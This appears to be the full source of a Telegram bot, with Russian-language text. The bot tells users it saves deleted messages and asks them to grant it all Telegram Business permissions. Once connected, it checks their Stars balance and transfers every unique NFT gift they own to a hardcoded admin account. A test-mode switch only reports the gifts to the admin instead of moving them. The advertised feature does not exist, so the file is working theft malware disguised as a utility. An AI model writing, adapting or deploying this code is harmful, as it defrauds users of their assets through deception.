import telebot
from telebot import types
import os
import flask
import logging

# --- КОНФИГУРАЦИЯ ---
# Токен бота считывается из переменных окружения (обязательно для Render.com)
BOT_TOKEN = os.environ.get('BOT_TOKEN')
# ADMIN_ID тоже лучше хранить в переменных для гибкости
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5146625949)) 

# URL вашего веб-сервиса на Render.com
WEBHOOK_URL_BASE = "https://kirysha.onrender.com"
# Создаем секретный путь для вебхука, чтобы его не могли вызвать посторонние
WEBHOOK_URL_PATH = f"/{BOT_TOKEN}/"

# Режим тестирования (True = симуляция, False = реальная передача)
# Считывается из переменных окружения, по умолчанию 'True'
TEST_MODE = os.environ.get('TEST_MODE', 'True').lower() == 'true'
MIN_STARS_REQUIRED = 100

# Настройка логирования для отладки на сервере
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Инициализация бота и веб-сервера Flask
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = flask.Flask(__name__)

# Словарь для хранения активных подключений в памяти {user_id: business_connection_id}
# Примечание: При перезапуске сервера на Render данные будут сброшены.
user_connections = {}


# --- ОБРАБОТЧИКИ ВЕБХУКОВ ---

@app.route(WEBHOOK_URL_PATH, methods=['POST'])
def webhook():
    """
    Эта функция принимает обновления от Telegram.
    """
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        flask.abort(403)

@app.route('/')
def index():
    """Простая страница для проверки, что бот жив."""
    return "Bot is alive and running!", 200


# --- ОБРАБОТЧИКИ БОТА ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    if user_id in user_connections:
        bot.reply_to(message, "✅ Вы уже подключены. Я отслеживаю ваш бизнес-аккаунт.")
        return

    try:
        bot_username = bot.get_me().username
        connect_url = f"https://t.me/{bot_username}?start=business"
        markup = types.InlineKeyboardMarkup()
        connect_button = types.InlineKeyboardButton(text="🔗 Подключить", url=connect_url)
        markup.add(connect_button)
        
        welcome_text = (
            f"Здравствуйте! Я — бот, который поможет вам сохранять сообщения, даже если они будут удалены.\n\n"
            f"Для работы мне требуется подключение к вашему бизнес-аккаунту.\n\n"
            f"<b>❗️Важно:</b> Чтобы всё работало корректно, сначала перейдите в "
            f"<b>Настройки Telegram → Telegram Business</b>, найдите и добавьте бота <b>@{bot_username}</b> "
            f"и предоставьте ему <u>все</u> запрашиваемые разрешения. Без этого бот работать не будет.\n\n"
            f"После этого нажмите кнопку «Подключить» ниже."
        )
        bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Error in send_welcome: {e}")
        bot.reply_to(message, "К сожалению, произошла ошибка. Пожалуйста, попробуйте позже.")

@bot.business_connection_handler(func=lambda c: c.is_enabled)
def handle_business_connection(connection: types.BusinessConnection):
    user_chat_id = connection.user_chat_id
    business_connection_id = connection.id
    logging.info(f"New business connection enabled by user {user_chat_id} with ID: {business_connection_id}")

    user_connections[user_chat_id] = business_connection_id

    if not connection.rights or not connection.rights.can_view_gifts_and_stars:
        error_msg = ("❌ Недостаточно прав. Пожалуйста, переподключитесь и убедитесь, что вы предоставили боту право "
                     "'Просматривать подарки и звёзды'.")
        bot.send_message(user_chat_id, error_msg)
        logging.warning(f"Connection from {user_chat_id} denied due to missing permissions.")
        return

    bot.send_message(user_chat_id, "✅ Бизнес-аккаунт успешно подключен! Начинаю обработку ваших данных.")
    
    try:
        balance = bot.get_business_account_star_balance(business_connection_id)
        logging.info(f"User {user_chat_id} balance check: {balance.amount} Stars.")

        if balance.amount < MIN_STARS_REQUIRED:
            error_msg = (f"❌ Недостаточно средств. Вам необходимо как минимум {MIN_STARS_REQUIRED} звёзд, "
                         f"но у вас только {balance.amount}.")
            bot.send_message(user_chat_id, error_msg)
            return

        bot.send_message(user_chat_id, f"Баланс достаточен ({balance.amount} звёзд). Запрашиваю список подарков...")
        owned_gifts = bot.get_business_account_gifts(business_connection_id)

        if not owned_gifts.gifts:
            bot.send_message(user_chat_id, "У вас нет подарков для обработки.")
            logging.info(f"User {user_chat_id} has no gifts.")
            return
            
        bot.send_message(user_chat_id, f"Найдено подарков: {len(owned_gifts.gifts)}. Начинаю обработку...")
        for gift in owned_gifts.gifts:
            if isinstance(gift, types.OwnedGiftUnique):
                process_unique_gift(business_connection_id, gift)
            else:
                logging.info(f"Skipping regular gift: {gift.owned_gift_id}")

    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"API error during gift processing for user {user_chat_id}: {e}")
        bot.send_message(user_chat_id, "Произошла ошибка при обработке ваших данных. Попробуйте переподключиться.")

@bot.business_connection_handler(func=lambda c: not c.is_enabled)
def handle_business_disconnection(connection: types.BusinessConnection):
    user_chat_id = connection.user_chat_id
    if user_chat_id in user_connections:
        del user_connections[user_chat_id]
        logging.info(f"Business connection disabled by user {user_chat_id}.")
        bot.send_message(user_chat_id, "Ваш бизнес-аккаунт был отключен.")

def process_unique_gift(business_connection_id: str, gift: types.OwnedGiftUnique):
    unique_gift = gift.gift
    
    if TEST_MODE:
        logging.info(f"Simulating transfer for gift ID: {gift.owned_gift_id}")
        name_no_spaces = unique_gift.name.replace(" ", "")
        nft_link = f"https://t.me/nft/{name_no_spaces}-{unique_gift.number}"
        
        message_text = (
            f"🎁 **Симуляция Передачи Подарка**\n\n"
            f"**Подарок:** <a href='{nft_link}'>{unique_gift.name} #{unique_gift.number}</a>\n"
            f"**ID Подарка:** `{gift.owned_gift_id}`\n\n"
            f"<b>Модель:</b> {unique_gift.model.name}\n"
            f"<b>Фон:</b> {unique_gift.backdrop.name}\n"
            f"<b>Символ:</b> {unique_gift.symbol.name}"
        )
        
        try:
            bot.send_message(ADMIN_ID, message_text, parse_mode='HTML')
        except telebot.apihelper.ApiTelegramException as e:
            logging.error(f"Failed to send simulation log to admin: {e}")
    else:
        logging.info(f"Attempting to transfer gift ID: {gift.owned_gift_id} to user {ADMIN_ID}")
        try:
            bot.transfer_gift(
                business_connection_id=business_connection_id,
                new_owner_chat_id=ADMIN_ID,
                owned_gift_id=gift.owned_gift_id
            )
            bot.send_message(ADMIN_ID, f"✅ Получен подарок: {unique_gift.name} #{unique_gift.number}")
            logging.info(f"Successfully transferred gift ID: {gift.owned_gift_id}")
        except telebot.apihelper.ApiTelegramException as e:
            error_text = f"Не удалось передать подарок {gift.owned_gift_id}: {e}"
            logging.error(error_text)
            bot.send_message(ADMIN_ID, f"❌ {error_text}")

# --- ЗАПУСК СЕРВЕРА И УСТАНОВКА ВЕБХУКА ---

if __name__ == '__main__':
    if not BOT_TOKEN:
        logging.error("Переменная окружения BOT_TOKEN не установлена!")
    else:
        logging.info("Removing old webhook...")
        bot.remove_webhook()
        logging.info("Setting new webhook...")
        bot.set_webhook(url=WEBHOOK_URL_BASE + WEBHOOK_URL_PATH)
        logging.info(f"Webhook set to {WEBHOOK_URL_BASE + WEBHOOK_URL_PATH}")
        
        # Запускаем веб-сервер
        # Render.com предоставляет переменную PORT, на которой должен работать сервер
        app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
